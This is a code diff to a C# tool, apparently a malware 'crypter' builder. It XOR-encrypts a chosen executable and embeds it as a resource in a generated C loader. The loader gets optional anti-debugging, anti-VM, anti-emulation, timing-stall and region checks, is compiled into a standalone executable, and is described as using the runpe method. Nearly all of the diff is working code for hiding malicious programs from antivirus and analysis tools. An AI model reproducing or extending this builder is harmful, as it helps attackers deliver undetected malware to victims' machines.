@@ -17,7 +17,13 @@ namespace Exe_Morphing_Util
 
     public partial class FormMain : Form
     {
+        
+        public int payloadcryptkey;
         bool devmode = true;
+        
+        
+        
+
 
         private string[] str_psapi_funcs = new string[]
         {
@@ -538,7 +544,7 @@ namespace Exe_Morphing_Util
         {
             string file_gonna_mess_with = tbfilehere.Text;
             // anything that happens happens here for the sake of being able to quit should the need arise
-            File.Copy(tbfilehere.Text, tbfilehere.Text + ".bak"); // save backup before changing stuff
+            File.Copy(tbfilehere.Text, tbfilehere.Text + ".bak",true); // save backup before changing stuff
 
             if (!IsExecutable(file_gonna_mess_with))
             {
@@ -594,12 +600,22 @@ namespace Exe_Morphing_Util
             {
                 File.Delete("\\builder\\res\\pload.joe");
             }
+            if (File.Exists("\\builder\\res\\tempload.joe"))
+            {
+                File.Delete("\\builder\\res\\tempload.joe");
+            }
             if (File.Exists("\\output_dir\\gogopowerrangers.exe"))
             {
                 File.Delete("\\output_dir\\gogopowerrangers.exe");
             }
+            // why not base64 it FIRST, then encrypt it when its in that format, THEN decrypt to b64 and run?
+            // no, ENCRYPT FIRST
+            // THEN BASE64 ENCODE for storage
+            // then base64 decode 
+            // then decrypt LAST
             encryptpayload(tbfilehere.Text);
-            //B64_payload(tbfilehere.Text);
+            // superceced by encryption
+            // B64_payload(Application.StartupPath + "\\builder\\res\\tempload.joe");
             // 
             AV_Evasions();
             MakeLoader();
@@ -608,7 +624,7 @@ namespace Exe_Morphing_Util
             // now lets have some fun - modify the main exe, add a new section, mark it RWE, add code to it?
             // FillNewSection(tbfilehere.Text, 7);
             // ok, new section crearted, added crap to it, plus jump home
-            // no, we're doing the C compiler / runpe method
+            // no, we're doing the C compiler / runpe method. fuck doing it outselves in C#
 
             MessageBox.Show("All Done!", "=]");
         }
@@ -639,79 +655,90 @@ namespace Exe_Morphing_Util
             File.Copy("barebones\\dont_touch_me.joe", "builder\\joe_crypter.c", true);
             FileStream fs = new FileStream("builder\\joe_crypter.c", FileMode.Open);
             StreamWriter sw = new StreamWriter(fs);
-            
 
-            fs.Seek(1797, SeekOrigin.Begin);
-                    // make adjustments to file based on checkboxes
+
+
+            // make adjustments to file based on checkboxes
+            // start by placing the string key in the file for decryption
+            // fs.Seek(0, SeekOrigin.Current); // rewind.............. does nothing
+            // head banging bug - WHY THE FUCK DOES IT WRITE WAY THE FUCK AT POS 1736? 
+            // its SUPPOSED to write at the BEGINNING of the file, but NOOOOOO,  some bug, who the FUCK KNOWS. fine, code it another way. 
+           
+            fs.Seek(1035, SeekOrigin.Current);
+            sw.Write("                                               ");
+            sw.WriteLine("int crytptkey = " + payloadcryptkey + ";");
+            // now we do our evasions
+            fs.Seek(1736, SeekOrigin.Begin);
+           
             if (cbAntiDebug.Checked)
             {
-                sw.Write("checkQIP();");
-                sw.Write("if (GetNtGlobalFlags() == 'p')");
-                sw.Write("{");
-                sw.Write("PassToNoobs();");
-                sw.Write("}");
-                sw.Write("if (GetBeingDebugged())");
-                sw.Write("{");
-                sw.Write("PassToNoobs();");
-                sw.Write("}");
-                sw.Write("GetHeapFlags();");
-                sw.Write("AnotherAntiDebugRoutine();");
-                sw.Write("GS_Check();");
+                sw.WriteLine("checkQIP();");
+                sw.WriteLine("if (GetNtGlobalFlags() == 'p')");
+                sw.WriteLine("{");
+                sw.WriteLine("PassToNoobs();");
+                sw.WriteLine("}");
+                sw.WriteLine("if (GetBeingDebugged())");
+                sw.WriteLine("{");
+                sw.WriteLine("PassToNoobs();");
+                sw.WriteLine("}");
+                sw.WriteLine("GetHeapFlags();");
+                sw.WriteLine("AnotherAntiDebugRoutine();");
+                sw.WriteLine("GS_Check();");
             }
             if (cbAntiEmu.Checked)
             {
-                sw.Write("AntiEmu();");
+                sw.WriteLine("AntiEmu();");
             }
             if (cbAntiVM.Checked)
             {
-                sw.Write("special_usercheck();");
-                sw.Write("MemSizeTrick();");
-                sw.Write("if (IsInsideVMWare())");
-                sw.Write("{");
-                sw.Write("PassToNoobs();");
-                sw.Write("}");
-                sw.Write("reg_enum_vm_check();");
-                sw.Write("anti_vm_wmi();");
+                sw.WriteLine("special_usercheck();");
+                sw.WriteLine("MemSizeTrick();");
+                sw.WriteLine("if (IsInsideVMWare())");
+                sw.WriteLine("{");
+                sw.WriteLine("PassToNoobs();");
+                sw.WriteLine("}");
+                sw.WriteLine("reg_enum_vm_check();");
+                sw.WriteLine("anti_vm_wmi();");
             }
             if (cbSpecial.Checked)
             {
-                sw.Write("JoeSpecial();");
-                
+                sw.WriteLine("JoeSpecial();");
+
             }
             if (cbFakeWindows.Checked)
             {
-                sw.Write("LotsOfWindows(hwnd);");
+                sw.WriteLine("LotsOfWindows(hwnd);");
             }
             if (cbFLS.Checked)
             {
-                sw.Write("FlsTrick();");
+                sw.WriteLine("FlsTrick();");
             }
             if (cbLongStall.Checked)
             {
-                sw.Write("LongStall();");
-                sw.Write("timing_evasion_3();");
+                sw.WriteLine("LongStall();");
+                sw.WriteLine("timing_evasion_3();");
             }
             if (cbMallocTrick.Checked)
             {
-                sw.Write("AllocMem_Fornoreason();");
+                sw.WriteLine("AllocMem_Fornoreason();");
 
             }
             if (cbNuma.Checked)
             {
-                sw.Write("NumaEvas();");
+                sw.WriteLine("NumaEvas();");
 
             }
             if (cbProcessMem.Checked)
             {
-                sw.Write("procmem_evas();");
+                sw.WriteLine("procmem_evas();");
             }
             if (cbDateSpecific.Checked)
             {
-                sw.Write("datesp_ecific_check(\"" + cbRegion.SelectedText + "\");");
+                sw.WriteLine("datesp_ecific_check(\"" + cbRegion.SelectedText + "\");");
             }
             if (cbRegionSpecific.Checked)
             {
-                sw.Write("region_specific_check(\"" + dtp.Value.ToShortDateString() + "\");");
+                sw.WriteLine("region_specific_check(\"" + dtp.Value.ToShortDateString() + "\");");
             }
 
             sw.Close();  fs.Close();
@@ -730,14 +757,15 @@ namespace Exe_Morphing_Util
             // aka compile time
             // make loader
 
-            string compilerexe = "pocc.exe";
-            string rsrcexe = "porc.exe";
-            string linkexe = "polink.exe";
+            string compilerexe  = "pocc.exe";
+            string rsrcexe      = "porc.exe";
+            string linkexe      = "polink.exe";
 
 
             string sourcepath = Application.StartupPath + "\\builder\\joe_crypter.c";
             string objpath = Application.StartupPath + "\\builder\\joe_crypter.obj";
             // string payloadpath = Application.StartupPath + "\\builder\\res\\pload.joe";
+            // see \builder\payload.r, points to \\res\\payload.joe
             string rsrs1 = Application.StartupPath + "\\builder\\payload.rc";
             string rsrs2 = Application.StartupPath + "\\builder\\payload.res";
             string finalexe = Application.StartupPath + "\\output_dir\\gogopowerrangers.exe";
@@ -757,7 +785,7 @@ namespace Exe_Morphing_Util
             sw.WriteLine(rsrcexe + " \"" + rsrs1 + "\" -Fo\"" + rsrs2 + "\"");
 			// link
             sw.WriteLine(linkexe + " -subsystem:windows -machine:X86 -largeaddressaware " +
-                "-base:0x10000 kernel32.lib user32.lib gdi32.lib comctl32.lib comdlg32.lib Rpcrt4.lib" +
+                "-base:0x10000 kernel32.lib user32.lib gdi32.lib comctl32.lib comdlg32.lib Rpcrt4.lib " +
                 "winmm.lib oleaut32.lib ole32.lib wbemuuid.lib Advapi32.lib -out:\"" + finalexe + "\" \"" + objpath + "\" \"" + rsrs2 + "\"");
             sw.WriteLine("echo Payload sucessfully built and saved to " + finalexe);
             sw.WriteLine("pause");
@@ -1137,14 +1165,20 @@ namespace Exe_Morphing_Util
         }
 
 
-       public static void encryptpayload(string filename)
+       public void encryptpayload(string filename) // encryted by random key, set at startup.
         {
             Encoding ascii = Encoding.ASCII;
             Random ran = new Random();
-            string keykey = ran.Next(2147483647).ToString("X8") + ran.Next(2147483647).ToString("X8");
-            byte[] newfile = RC4.Encrypt(ascii.GetBytes(keykey), File.ReadAllBytes(filename));
-            File.WriteAllBytes(Application.StartupPath + "\\builder\\res\\pload.joe", newfile);
-            
+            int keykey = ran.Next(10000,99999);
+            byte[] newfile = File.ReadAllBytes(filename);
+            byte[] resultBuffer = new byte[newfile.Length];
+            for (int i = 0; i < newfile.Length; i++)
+            {
+                resultBuffer[i] = (byte)(newfile[i] ^ keykey);
+            }
+
+            File.WriteAllBytes(Application.StartupPath + "\\builder\\res\\pload.joe", resultBuffer);
+            payloadcryptkey = keykey;
 
         }
         public static void B64_payload(string filename)
@@ -1152,6 +1186,8 @@ namespace Exe_Morphing_Util
             byte[] filebuff = File.ReadAllBytes(filename);
             string payload = Convert.ToBase64String(filebuff);
             File.WriteAllText(Application.StartupPath + "\\builder\\res\\pload.joe", payload);
+            File.Delete(Application.StartupPath + "\\builder\\res\\tempload.joe");
+            
         }
 
         private void loadExeToolStripMenuItem_Click(object sender, EventArgs e)
